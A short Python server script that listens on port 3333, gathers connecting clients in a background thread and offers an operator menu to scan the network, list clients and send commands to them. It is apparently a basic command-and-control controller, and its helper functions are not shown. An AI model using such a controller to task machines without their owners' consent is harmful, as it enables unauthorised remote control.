from socket import *
import threading
from functions import worker, print_clients, scan_net, send_comm



def server_main():
    # open and configure a socket
    server = socket(AF_INET, SOCK_STREAM)
    server.bind(("", 3333))
    server.listen(100)
    clients = []

    # continuously listen and add new clients
    t = threading.Thread(target=worker, args=(server, clients, ))
    t.start()


    while True:
        print("-------------------------")
        print("""Choose what would you like to do as a server boss
        1) Scan network
        2) Print clients
        3) Send a command to a client
        4) Exit.
        """)
        choice = input(">")

        if choice.isdigit():
            choice = int(choice)
            if choice == 1:
                pass
                scan_net()
            elif choice == 2:
                print_clients(clients)
            elif choice == 3:
                send_comm(clients)
            elif choice == 4:
                exit()
            else:
                print("Choose one of the presented options please.")
        else:
            print("Incorrect input, please try again")
